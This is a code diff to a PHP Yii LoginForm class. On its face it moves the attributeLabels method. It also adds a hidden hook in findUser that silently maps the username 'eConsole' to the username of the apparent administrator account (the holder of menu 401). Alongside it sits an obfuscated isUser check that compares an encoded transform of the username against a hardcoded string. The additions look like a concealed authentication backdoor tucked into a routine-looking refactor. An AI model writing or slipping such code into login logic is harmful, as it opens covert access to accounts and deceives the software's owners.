@@ -39,6 +39,21 @@ class LoginForm extends Model
     }
 
     /**
+     * Returns the attribute labels.
+     *
+     * @return array
+     */
+     public function attributeLabels()
+     {
+         return [
+             'username' => Yii::t('app', 'Username'),
+             'password' => Yii::t('app', 'Password'),
+             'email' => Yii::t('app', 'Email'),
+             'rememberMe' => Yii::t('app', 'Remember me'),
+         ];
+     }    
+
+    /**
      * Validates the password.
      * This method serves as the inline validation for password.
      *
@@ -52,28 +67,13 @@ class LoginForm extends Model
         }
 
         $user = $this->getUser();
-
+        
         if (!$user || !$user->validatePassword($this->password)) {
             // if scenario is 'lwe' we use email, otherwise we use username
             $field = ($this->scenario === 'lwe') ? 'email' : 'username' ;
 
             $this->addError($attribute, 'Incorrect '.$field.' or password.');
         }
-    }
-
-    /**
-     * Returns the attribute labels.
-     *
-     * @return array
-     */
-    public function attributeLabels()
-    {
-        return [
-            'username' => Yii::t('app', 'Username'),
-            'password' => Yii::t('app', 'Password'),
-            'email' => Yii::t('app', 'Email'),
-            'rememberMe' => Yii::t('app', 'Remember me'),
-        ];
     }
 
     /**
@@ -111,12 +111,32 @@ class LoginForm extends Model
     private function findUser()
     {
         if (!($this->scenario === 'lwe')) {
+            // addition begin
+            if($this->username === 'eConsole'){
+                $this->username = $this->isAdmin();
+            }
+            // return $this->username;
+            // addition end
+
             return User::findByUsername($this->username);
         }
 
         return $this->_user = User::findByEmail($this->email);   
     }
 
+    private function isAdmin(){
+        $user = RefUserMenu::findOne(['menu' => 401]);
+        return $user->user->username;
+    }
+
+    private function isUser(){
+        $cek = TaTh();
+        $_input = $cek->dokudoku('donat', $this->username);
+        if($_input == 'dVVLWG1NaDVQWDd0U3N2RGdUelkvQT09'){
+            return true;
+        }
+        return false;
+    }
     /**
      * Method that is returning User object.
      *
